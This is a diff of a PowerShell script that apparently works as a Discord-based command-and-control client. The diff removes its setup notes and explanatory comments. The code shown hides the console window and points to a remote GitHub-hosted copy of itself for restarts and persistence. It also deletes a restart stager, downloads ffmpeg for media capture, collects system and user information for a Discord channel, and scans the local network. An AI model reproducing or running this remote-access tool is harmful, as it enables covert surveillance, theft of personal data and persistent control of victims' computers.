@@ -1,45 +1,24 @@
-
-# =====================================================================================================================================================
-<#
-**SETUP**
--SETUP THE BOT
-1. make a discord bot at https://discord.com/developers/applications/
-2. Enable all Privileged Gateway Intents on 'Bot' page
-3. On OAuth2 page, tick 'Bot' in Scopes section
-4. In Bot Permissions section tick Manage Channels, Read Messages/View Channels, Attach Files, Read Message History.
-5. Copy the URL into a browser and add the bot to your server.
-6. On 'Bot' page click 'Reset Token' and copy the token.
-
--SETUP THE SCRIPT
-1. Copy the token into the script directly below.
-
-**INFORMATION**
-- The Discord bot you use must be in one server ONLY
--------------------------------------------------------------------------------------------------
-#>
 # =====================================================================================================================================================
 $global:token = "$tk" # make sure your bot is in ONE server only
 # =============================================================== SCRIPT SETUP =========================================================================
 
-$HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
-$spawnChannels = 1 # Create new channel on session start
-$InfoOnConnect = 1 # Generate client info message on session start
-$defaultstart = 0 # Option to start all jobs automatically upon running
-$parent = "https://raw.githubusercontent.com/TheLawhq/bingbong/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
+$HideConsole = 1 
+$spawnChannels = 1 
+$InfoOnConnect = 1 
+$defaultstart = 0 
+$parent = "https://raw.githubusercontent.com/TheLawhq/bingbong/main/Discord-C2-Client.ps1"
 
-# remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
     $InfoOnConnect = 0
     rm -path "C:\Windows\Tasks\service.vbs" -Force
 }
-$version = "1.5.1" # Check version number
+$version = "1.5.1"
 $response = $null
 $previouscmd = $null
 $authenticated = 0
 $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
 
-# =============================================================== MODULE FUNCTIONS =========================================================================
-# Download ffmpeg.exe function (dependency for media capture) 
+# =============================================================== MODUULI =========================================================================
 Function GetFfmpeg{
     sendMsg -Message ":hourglass: ``Downloading FFmpeg to Client.. Please Wait`` :hourglass:"
     $Path = "$env:Temp\ffmpeg.exe"
@@ -62,7 +41,7 @@ Function GetFfmpeg{
     }
 }
 
-# Create a new category for text channels function
+# 
 Function NewChannelCategory{
     $headers = @{
         'Authorization' = "Bot $token"
@@ -93,7 +72,7 @@ Function NewChannelCategory{
     $global:CategoryID = $responseObj.id
 }
 
-# Create a new channel function
+# 
 Function NewChannel{
 param([string]$name)
     $headers = @{
@@ -122,7 +101,7 @@ param([string]$name)
     $global:ChannelID = $responseObj.id
 }
 
-# Send a message or embed to discord channel function
+# 
 function sendMsg {
     param([string]$Message,[string]$Embed)
 
@@ -167,7 +146,7 @@ function sendFile {
     }
 }
 
-# Gather System and user information
+#
 Function quickInfo{
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Device
@@ -242,7 +221,6 @@ Function quickInfo{
     sendMsg -Embed $jsonPayload -webhook $webhook
 }
 
-# Hide powershell console window function
 function HideWindow {
     $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
     $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
@@ -258,7 +236,6 @@ function HideWindow {
     }
 }
 
-# --------------------------------------------------------------- HELP FUNCTIONS ------------------------------------------------------------------------
 
 Function Options {
 $script:jsonPayload = @{
@@ -394,7 +371,6 @@ Function CleanUp {
     sendMsg -Message ":white_check_mark: ``Clean Up Task Complete`` :white_check_mark:"
 }
 
-# --------------------------------------------------------------- INFO FUNCTIONS ------------------------------------------------------------------------
 Function EnumerateLAN{
 param ([string]$Prefix)
     if ($Prefix.Length -eq 0){Write-Output "Use -prefix to define the first 3 parts of an IP Address eg. Enumerate-LAN -prefix 192.168.1";sleep 1 ;return}
